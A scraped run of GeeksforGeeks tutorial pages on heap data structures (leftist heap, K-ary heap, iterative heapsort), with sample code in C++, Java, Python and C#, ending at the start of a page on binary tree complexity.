h1->right = Merge(h1->right, h2); if (h1->left->dist < h1->right->dist) swapChildren(h1); h1->dist = h1->right->dist + 1; } return h1; } // Swaps t's two children. void LeftistHeap::swapChildren(LeftistNode * t) { LeftistNode *tmp = t->left; t->left = t->right; t->right = tmp; } /* Insert item x into the priority queue, maintaining heap order.*/ void LeftistHeap::Insert(int &x) { root = Merge(new LeftistNode(x), root); } /* Find the smallest item in the priority queue. Return the smallest item, or throw Underflow if empty.*/ int &LeftistHeap::findMin() { return root->element; } /* Remove the smallest item from the priority queue. Throws Underflow if empty.*/ void LeftistHeap::deleteMin() { LeftistNode *oldRoot = root; root = Merge(root->left, root->right); delete oldRoot; } /* Remove the smallest item from the priority queue. Pass back the smallest item, or throw Underflow if empty.*/ void LeftistHeap::deleteMin(int &minItem) { if (isEmpty()) { cout<<"Heap is Empty"<<endl; return; } minItem = findMin(); deleteMin(); } /* Test if the priority queue is logically empty. Returns true if empty, false otherwise*/ bool LeftistHeap::isEmpty() { return root == NULL; } /* Test if the priority queue is logically full. Returns false in this implementation.*/ bool LeftistHeap::isFull() { return false; } // Make the priority queue logically empty void LeftistHeap::makeEmpty() { reclaimMemory(root); root = NULL; } // Deep copy LeftistHeap &LeftistHeap::operator =(LeftistHeap & rhs) { if (this != &rhs) { makeEmpty(); root = clone(rhs.root); } return *this; } // Internal method to make the tree empty. void LeftistHeap::reclaimMemory(LeftistNode * t) { if (t != NULL) { reclaimMemory(t->left); reclaimMemory(t->right); delete t; } } // Internal method to clone subtree. LeftistNode *LeftistHeap::clone(LeftistNode * t) { if (t == NULL) return NULL; else return new LeftistNode(t->element, clone(t->left), clone(t->right), t->dist); } //Driver program int main() { LeftistHeap h; LeftistHeap h1; LeftistHeap h2; int x; int arr[]= {1, 5, 7, 10, 15}; int arr1[]= {22, 75}; h.Insert(arr[0]); h.Insert(arr[1]); h.Insert(arr[2]); h.Insert(arr[3]); h.Insert(arr[4]); h1.Insert(arr1[0]); h1.Insert(arr1[1]); h.deleteMin(x); cout<< x <<endl; h1.deleteMin(x); cout<< x <<endl; h.Merge(h1); h2 = h; h2.deleteMin(x); cout<< x << endl; return 0; } chevron_right filter_none Output: 1 22 5 References: Wikipedia- Leftist Tree CSC378: Leftist Trees This article is contributed by Sheena Kohli and Minal Sunil Parchand. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapTournament Tree (Winner Tree) and Binary HeapGiven level order traversal of a Binary Tree, check if the Tree is a Min-HeapCheck if a given Binary Tree is HeapHeight of a complete binary tree (or Heap) with N nodesOverview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash)Applications of Heap Data StructureTime Complexity of building a heapWhy is Binary Heap Preferred over BST for Priority Queue?Fibonacci Heap | Set 1 (Introduction)K-ary HeapHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Implementation of Binomial HeapWhere is Heap Sort used practically?Binary HeapArray Representation Of Binary HeapHow to implement stack using priority queue or heap? Article Tags : Advanced Data StructureHeapTree Practice Tags : TreeHeap thumb_up 2 To-do Done 4 Based on 10 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Check mirror in n-ary tree Next last_page Order statistic tree using fenwick tree (BIT) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Advanced Data Structure Proof that traveling salesman problem is NP HardSome Basic Theorems on TreesExtendible Hashing (Dynamic approach to DBMS)Design a Chess GameDifference between B tree and B+ tree Most visited in Heap Huffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Arrayk largest(or smallest) elements in an array | added Min Heap methodReal-time application of Data Structures room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

K-ary Heap - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Applications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapK'th Smallest/Largest Element in Unsorted Array | Set 1Huffman Coding | Greedy Algo-3k largest(or smallest) elements in an array | added Min Heap methodMerge k sorted arrays | Set 1Building Heap from ArrayMedian in a stream of integers (running integers)Sort a nearly sorted (or K sorted) arrayMax Heap in JavaRearrange characters in a string such that no two adjacent are sameInsertion and Deletion in HeapsMedian of Stream of Running Integers using STLHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Overview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash) K-ary Heap Last Updated: 01-10-2018 Prerequisite – Binary Heap K-ary heaps are a generalization of binary heap(K=2) in which each node have K children instead of 2. Just like binary heap, it follows two properties: 1) Nearly complete binary tree, with all levels having maximum number of nodes except the last, which is filled in left to right manner. 2) Like Binary Heap, it can be divided into two categories: (a) Max k-ary heap (key at root is greater than all descendants and same is recursively true for all nodes). (b) Min k-ary heap (key at root is lesser than all descendants and same is recursively true for all nodes) Examples: 3-ary max heap - root node is maximum of all nodes 10 / | \ 7 9 8 / | \ / 4 6 5 7 3-ary min heap -root node is minimum of all nodes 10 / | \ 12 11 13 / | \ 14 15 18 The height of a complete k-ary tree with n-nodes is given by logkn. Applications of K-ary Heap: K-ary heap when used in the implementation of priority queue allows faster decrease key operation as compared to binary heap ( O(log2n)) for binary heap vs O(logkn) for K-ary heap). Nevertheless, it causes the complexity of extractMin() operation to increase to O(k log kn) as compared to the complexity of O(log2n) when using binary heaps for priority queue. This allows K-ary heap to be more efficient in algorithms where decrease priority operations are more common than extractMin() operation.Example: Dijkstra’s algorithm for single source shortest path and Prim’s algorithm for minimum spanning tree K-ary heap has better memory cache behaviour than a binary heap which allows them to run more quickly in practice, although it has a larger worst case running time of both extractMin() and delete() operation (both being O(k log kn) ). Implementation Assuming 0 based indexing of array, an array represents a K-ary heap such that for any node we consider: Parent of the node at index i (except root node) is located at index (i-1)/k Children of the node at index i are at indices (k*i)+1 , (k*i)+2 …. (k*i)+k The last non-leaf node of a heap of size n is located at index (n-2)/k buildHeap() : Builds a heap from an input array. This function runs a loop starting from the last non-leaf node all the way upto the root node, calling a function restoreDown(also known as maHeapify) for each index that restores the passed index at the correct position of the heap by shifting the node down in the K-ary heap building it in a bottom up manner. Why do we start the loop from the last non-leaf node ? Because all the nodes after that are leaf nodes which will trivially satisfy the heap property as they don’t have any children and hence, are already roots of a K-ary max heap. restoreDown() (or maxHeapify) : Used to maintain heap property. It runs a loop where it finds the maximum of all the node’s children, compares it with its own value and swaps if the max(value of all children) > (value at node). It repeats this step until the node is restored into its original position in the heap. extractMax() : Extracting the root node. A k-ary max heap stores the largest element in its root. It returns the root node, copies last node to the first, calls restore down on the first node thus maintaining the heap property. insert() : Inserting a node into the heap This can be achieved by inserting the node at the last position and calling restoreUp() on the given index to restore the node at its proper position in the heap. restoreUp() iteratively compares a given node with its parent, since in a max heap the parent is always greater than or equal to its children nodes, the node is swapped with its parent only when its key is greater than the parent. Combining the above, following is the C++ implementation of K-ary heap. filter_none edit close play_arrow link brightness_4 code // C++ program to demonstrate all operations of // k-ary Heap #include<bits/stdc++.h> using namespace std; // function to heapify (or restore the max- heap // property). This is used to build a k-ary heap // and in extractMin() // att[] -- Array that stores heap // len -- Size of array // index -- index of element to be restored // (or heapified) void restoreDown(int arr[], int len, int index, int k) { // child array to store indexes of all // the children of given node int child[k+1]; while (1) { // child[i]=-1 if the node is a leaf // children (no children) for (int i=1; i<=k; i++) child[i] = ((k*index + i) < len) ? (k*index + i) : -1; // max_child stores the maximum child and // max_child_index holds its index int max_child = -1, max_child_index ; // loop to find the maximum of all // the children of a given node for (int i=1; i<=k; i++) { if (child[i] != -1 && arr[child[i]] > max_child) { max_child_index = child[i]; max_child = arr[child[i]]; } } // leaf node if (max_child == -1) break; // swap only if the key of max_child_index // is greater than the key of node if (arr[index] < arr[max_child_index]) swap(arr[index], arr[max_child_index]); index = max_child_index; } } // Restores a given node up in the heap. This is used // in decreaseKey() and insert() void restoreUp(int arr[], int index, int k) { // parent stores the index of the parent variable // of the node int parent = (index-1)/k; // Loop should only run till root node in case the // element inserted is the maximum restore up will // send it to the root node while (parent>=0) { if (arr[index] > arr[parent]) { swap(arr[index], arr[parent]); index = parent; parent = (index -1)/k; } // node has been restored at the correct position else break; } } // Function to build a heap of arr[0..n-1] and alue of k. void buildHeap(int arr[], int n, int k) { // Heapify all internal nodes starting from last // non-leaf node all the way upto the root node // and calling restore down on each for (int i= (n-1)/k; i>=0; i--) restoreDown(arr, n, i, k); } // Function to insert a value in a heap. Parameters are // the array, size of heap, value k and the element to // be inserted void insert(int arr[], int* n, int k, int elem) { // Put the new element in the last position arr[*n] = elem; // Increase heap size by 1 *n = *n+1; // Call restoreUp on the last index restoreUp(arr, *n-1, k); } // Function that returns the key of root node of // the heap and then restores the heap property // of the remaining nodes int extractMax(int arr[], int* n, int k) { // Stores the key of root node to be returned int max = arr[0]; // Copy the last node's key to the root node arr[0] = arr[*n-1]; // Decrease heap size by 1 *n = *n-1; // Call restoreDown on the root node to restore // it to the correct position in the heap restoreDown(arr, *n, 0, k); return max; } // Driver program int main() { const int capacity = 100; int arr[capacity] = {4, 5, 6, 7, 8, 9, 10}; int n = 7; int k = 3; buildHeap(arr, n, k); printf("Built Heap : \n"); for (int i=0; i<n; i++) printf("%d ", arr[i]); int element = 3; insert(arr, &n, k, element); printf("\n\nHeap after insertion of %d: \n", element); for (int i=0; i<n; i++) printf("%d ", arr[i]); printf("\n\nExtracted max is %d", extractMax(arr, &n, k)); printf("\n\nHeap after extract max: \n"); for (int i=0; i<n; i++) printf("%d ", arr[i]); return 0; } chevron_right filter_none Output Built Heap : 10 9 6 7 8 4 5 Heap after insertion of 3: 10 9 6 7 8 4 5 3 Extracted max is 10 Heap after extract max: 9 8 6 7 3 4 5 Time Complexity Analysis For a k-ary heap, with n nodes the maximum height of the given heap will be logkn. So restoreUp() run for maximum of logkn times (as at every iteration the node is shifted one level up is case of restoreUp() or one level down in case of restoreDown). restoreDown() calls itself recursively for k children. So time complexity of this functions is O(k logkn). Insert and decreaseKey() operations call restoreUp() once. So complexity is O(logkn). Since extractMax() calls restoreDown() once, its complexity O(k logkn) Time complexity of build heap is O(n) (Analysis is similar to binary heap) This article is contributed by Anurag Rai. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapApplications of Heap Data StructureTournament Tree (Winner Tree) and Binary HeapTime Complexity of building a heapWhy is Binary Heap Preferred over BST for Priority Queue?Fibonacci Heap | Set 1 (Introduction)Check if a given Binary Tree is HeapHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Implementation of Binomial HeapWhere is Heap Sort used practically?Binary HeapArray Representation Of Binary HeapGiven level order traversal of a Binary Tree, check if the Tree is a Min-HeapHow to implement stack using priority queue or heap?Convert BST to Min HeapLeftist Tree / Leftist HeapMerge k sorted linked lists | Set 2 (Using Min Heap)Improved By : Amey Pawar, MohitRohatgi Article Tags : Heap Practice Tags : Heap thumb_up 3 To-do Done 3.5 Based on 17 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Overview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash) Next last_page Convert min Heap to max Heap Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Heap Real-time application of Data StructuresPriority Queue using Binary HeapHeap Sort for decreasing order using min heapMax Heap in PythonPriority Queue in Python More related articles in Heap Kth smallest element in a row-wise and column-wise sorted 2D array | Set 1Connect n ropes with minimum costMerge K sorted linked lists | Set 1Applications of Priority QueueHuffman Decoding room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Iterative HeapSort - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Binomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureK'th Smallest/Largest Element in Unsorted Array | Set 1Huffman Coding | Greedy Algo-3k largest(or smallest) elements in an array | added Min Heap methodMerge k sorted arrays | Set 1Building Heap from ArrayMedian in a stream of integers (running integers)Sort a nearly sorted (or K sorted) arrayMax Heap in JavaRearrange characters in a string such that no two adjacent are sameInsertion and Deletion in HeapsMedian of Stream of Running Integers using STLHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Overview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash) Iterative HeapSort Last Updated: 31-07-2019 HeapSort is a comparison based sorting technique where we first build Max Heap and then swaps the root element with last element (size times) and maintains the heap property each time to finally make it sorted. Examples: Input : 10 20 15 17 9 21 Output : 9 10 15 17 20 21 Input: 12 11 13 5 6 7 15 5 19 Output: 5 5 6 7 11 12 13 15 19 In first Example, first we have to build Max Heap. So, we will start from 20 as child and check for its parent. Here 10 is smaller, so we will swap these two. Now, 20 10 15 17 9 21 Now, child 17 is greater than its parent 10. So, both will be swapped and order will be 20 17 15 10 9 21 Now, child 21 is greater than parent 15. So, both will be swapped. 20 17 21 10 9 15 Now, again 21 is bigger than parent 20. So, 21 17 20 10 9 15 This is Max Heap. Now, we have to apply sorting. Here, we have to swap first element with last one and we have to maintain Max Heap property. So, after first swapping : 15 17 20 10 9 21 It clearly violates Max Heap property. So, we have to maintain it. So, order will be 20 17 15 10 9 21 17 10 15 9 20 21 15 10 9 17 20 21 10 9 15 17 20 21 9 10 15 17 20 21 Here, underlined part is sorted part. Recommended: Please try your approach on {IDE} first, before moving on to the solution. C++ filter_none edit close play_arrow link brightness_4 code // C++ program for implementation // of Iterative Heap Sort #include <bits/stdc++.h> using namespace std; // function build Max Heap where value // of each child is always smaller // than value of their parent void buildMaxHeap(int arr[], int n) { for (int i = 1; i < n; i++) { // if child is bigger than parent if (arr[i] > arr[(i - 1) / 2]) { int j = i; // swap child and parent until // parent is smaller while (arr[j] > arr[(j - 1) / 2]) { swap(arr[j], arr[(j - 1) / 2]); j = (j - 1) / 2; } } } } void heapSort(int arr[], int n) { buildMaxHeap(arr, n); for (int i = n - 1; i > 0; i--) { // swap value of first indexed // with last indexed swap(arr[0], arr[i]); // maintaining heap property // after each swapping int j = 0, index; do { index = (2 * j + 1); // if left child is smaller than // right child point index variable // to right child if (arr[index] < arr[index + 1] && index < (i - 1)) index++; // if parent is smaller than child // then swapping parent with child // having higher value if (arr[j] < arr[index] && index < i) swap(arr[j], arr[index]); j = index; } while (index < i); } } // Driver Code to test above int main() { int arr[] = {10, 20, 15, 17, 9, 21}; int n = sizeof(arr) / sizeof(arr[0]); printf("Given array: "); for (int i = 0; i < n; i++) printf("%d ", arr[i]); printf("\n\n"); heapSort(arr, n); // print array after sorting printf("Sorted array: "); for (int i = 0; i < n; i++) printf("%d ", arr[i]); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java implementation of Iterative Heap Sort public class HeapSort { // function build Max Heap where value // of each child is always smaller // than value of their parent static void buildMaxHeap(int arr[], int n) { for (int i = 1; i < n; i++) { // if child is bigger than parent if (arr[i] > arr[(i - 1) / 2]) { int j = i; // swap child and parent until // parent is smaller while (arr[j] > arr[(j - 1) / 2]) { swap(arr, j, (j - 1) / 2); j = (j - 1) / 2; } } } } static void heapSort(int arr[], int n) { buildMaxHeap(arr, n); for (int i = n - 1; i > 0; i--) { // swap value of first indexed // with last indexed swap(arr, 0, i); // maintaining heap property // after each swapping int j = 0, index; do { index = (2 * j + 1); // if left child is smaller than // right child point index variable // to right child if (index < (i - 1) && arr[index] < arr[index + 1]) index++; // if parent is smaller than child // then swapping parent with child // having higher value if (index < i && arr[j] < arr[index]) swap(arr, j, index); j = index; } while (index < i); } } public static void swap(int[] a, int i, int j) { int temp = a[i]; a[i]=a[j]; a[j] = temp; } /* A utility function to print array of size n */ static void printArray(int arr[]) { int n = arr.length; for (int i = 0; i < n; i++) System.out.print(arr[i] + " "); System.out.println(); } // Driver program public static void main(String args[]) { int arr[] = {10, 20, 15, 17, 9, 21}; int n = arr.length; System.out.print("Given array: "); printArray(arr); heapSort(arr, n); System.out.print("Sorted array: "); printArray(arr); } } chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python3 program for implementation # of Iterative Heap Sort # function build Max Heap where value # of each child is always smaller # than value of their parent def buildMaxHeap(arr, n): for i in range(n): # if child is bigger than parent if arr[i] > arr[int((i - 1) / 2)]: j = i # swap child and parent until # parent is smaller while arr[j] > arr[int((j - 1) / 2)]: (arr[j], arr[int((j - 1) / 2)]) = (arr[int((j - 1) / 2)], arr[j]) j = int((j - 1) / 2) def heapSort(arr, n): buildMaxHeap(arr, n) for i in range(n - 1, 0, -1): # swap value of first indexed # with last indexed arr[0], arr[i] = arr[i], arr[0] # maintaining heap property # after each swapping j, index = 0, 0 while True: index = 2 * j + 1 # if left child is smaller than # right child point index variable # to right child if (index < (i - 1) and arr[index] < arr[index + 1]): index += 1 # if parent is smaller than child # then swapping parent with child # having higher value if index < i and arr[j] < arr[index]: arr[j], arr[index] = arr[index], arr[j] j = index if index >= i: break # Driver Code if __name__ == '__main__': arr = [10, 20, 15, 17, 9, 21] n = len(arr) print("Given array: ") for i in range(n): print(arr[i], end = " ") print() heapSort(arr, n) # print array after sorting print("Sorted array: ") for i in range(n): print(arr[i], end = " ") # This code is contributed by PranchalK chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# implementation of Iterative Heap Sort using System; class HeapSort { // function build Max Heap where value // of each child is always smaller // than value of their parent static void buildMaxHeap(int []arr, int n) { for (int i = 1; i < n; i++) { // if child is bigger than parent if (arr[i] > arr[(i - 1) / 2]) { int j = i; // swap child and parent until // parent is smaller while (arr[j] > arr[(j - 1) / 2]) { swap(arr, j, (j - 1) / 2); j = (j - 1) / 2; } } } } static void heapSort(int []arr, int n) { buildMaxHeap(arr, n); for (int i = n - 1; i > 0; i--) { // swap value of first indexed // with last indexed swap(arr, 0, i); // maintaining heap property // after each swapping int j = 0, index; do { index = (2 * j + 1); // if left child is smaller than // right child point index variable // to right child if (index < (i - 1) && arr[index] < arr[index + 1]) index++; // if parent is smaller than child // then swapping parent with child // having higher value if (index < i && arr[j] < arr[index]) swap(arr, j, index); j = index; } while (index < i); } } public static void swap(int[] a, int i, int j) { int temp = a[i]; a[i] = a[j]; a[j] = temp; } /* A utility function to print array of size n */ static void printArray(int []arr) { int n = arr.Length; for (int i = 0; i < n; i++) Console.Write(arr[i] + " "); Console.WriteLine(); } // Driver Code public static void Main(String []args) { int []arr = {10, 20, 15, 17, 9, 21}; int n = arr.Length; Console.Write("Given array: "); printArray(arr); heapSort(arr, n); Console.Write("Sorted array: "); printArray(arr); } } // This code is contributed by Princi Singh chevron_right filter_none Output : Given array: 10 20 15 17 9 21 Sorted array: 9 10 15 17 20 21 Here, both function buildMaxHeap and heapSort runs in O(nlogn) time. So, overall time complexity is O(nlogn) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:HeapSortIterative Quick SortC Program for Iterative Merge SortJava Program for Iterative Merge SortPython Program for Iterative Merge SortC Program for Iterative Quick SortJava Program for Iterative Quick SortCheck if linked list is sorted (Iterative and Recursive)Iterative selection sort for linked listQuickSelect (A Simple Iterative Implementation)Iterative Merge SortProgram to check if an array is sorted or not (Iterative and Recursive)Split array into K subarrays with minimum sum of absolute difference between adjacent elementsQueries to check if sweets of given type can be eaten on given day or notkaditya139Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : PranchalKatiyar, vreflect, Rajput-Ji Article Tags : HeapSorting Practice Tags : SortingHeap thumb_up 2 To-do Done 2.6 Based on 5 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Find k-th smallest element in given n ranges Next last_page Sorting rows of matrix in ascending order followed by columns in descending order Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Heap Real-time application of Data StructuresPriority Queue using Binary HeapHeap Sort for decreasing order using min heapMax Heap in PythonPriority Queue in Python Most visited in Sorting Bubble SortInsertion SortSelection Sortstd::sort() in C++ STLTime Complexities of all Sorting Algorithms room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Complexity of different operations in Binary tree, Binary Search Tree and AVL tree - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAVL Tree | Set 1 (Insertion)AVL Tree | Set 2 (Deletion)Red-Black Tree | Set 1 (Introduction)Red-Black Tree | Set 2 (Insert)Red-Black Tree | Set 3 (Delete)C Program for Red Black Tree InsertionLeft Leaning Red Black Tree (Insertion)Binary Search Tree | Set 1 (Search and Insertion)Binary Search Tree | Set 2 (Delete)Advantages of BST over Hash TablePrint the longest leaf to leaf path in a Binary treePrint path from root to a given node in a binary treePrint root to leaf paths without using recursionPrint the nodes at odd levels of a treePrint all full nodes in a Binary TreePrint nodes between two given level numbers of a binary treePrint nodes at k distance from rootPrint Ancestors of a given node in Binary TreeCheck if a binary tree is subtree of another binary tree | Set 1Check if a binary tree is subtree of another binary tree | Set 2Check if a Binary Tree (not BST) has duplicate valuesCheck if a Binary Tree contains duplicate subtrees of size 2 or moreSerialize and Deserialize a Binary TreeConstruct BST from given preorder traversal | Set 2Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) Complexity of different operations in Binary tree, Binary Search Tree and 